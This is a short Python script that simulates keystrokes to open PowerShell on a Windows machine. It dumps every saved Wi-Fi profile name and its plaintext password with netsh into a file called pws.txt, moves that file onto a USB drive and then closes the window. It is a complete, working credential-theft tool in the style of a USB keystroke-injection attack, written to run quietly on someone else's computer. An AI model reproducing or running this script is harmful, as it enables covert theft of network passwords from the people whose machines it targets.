from keyboard import press_and_release, write
from os import getcwd
from time import sleep
from getpass import getuser

get_usernam = getuser()  # Get the current username
get_current_dir = getcwd()  # Get the current working directory

# Open Run command
press_and_release("win")
sleep(0.5)

write("pw") # Open PowerShell
sleep(0.2)

press_and_release("enter")
sleep(1)

write("cd Pictures")  # Change directory to Pictures
press_and_release("enter")
sleep(0.5)

write("echo > pws.txt")
sleep(0.5)
press_and_release("enter")
press_and_release("enter")
sleep(0.5)

# Create pws.txt file and append the extracted Wi-Fi profiles and passwords
write("""netsh wlan show profile | 
    Select-String '(?<=All User Profile\\s+:\\s).+' | 
    ForEach-Object {
        $wlan = $_.Matches.Value
        $passw = netsh wlan show profile $wlan key=clear |
            Select-String '(?<=Key Content\\s+:\\s).+'

        [pscustomobject]@{
            Name     = $wlan
            Password = $passw.Matches.Value
        }
    } > pws.txt""")
sleep(2)

press_and_release("enter")
sleep(1)

# Move the file to D:
write("mv 'pws.txt' D:") # NOTE: Change the name of the disk to your USB name
press_and_release("enter")
sleep(5)

# Close the PowerShell window
press_and_release("alt+f4")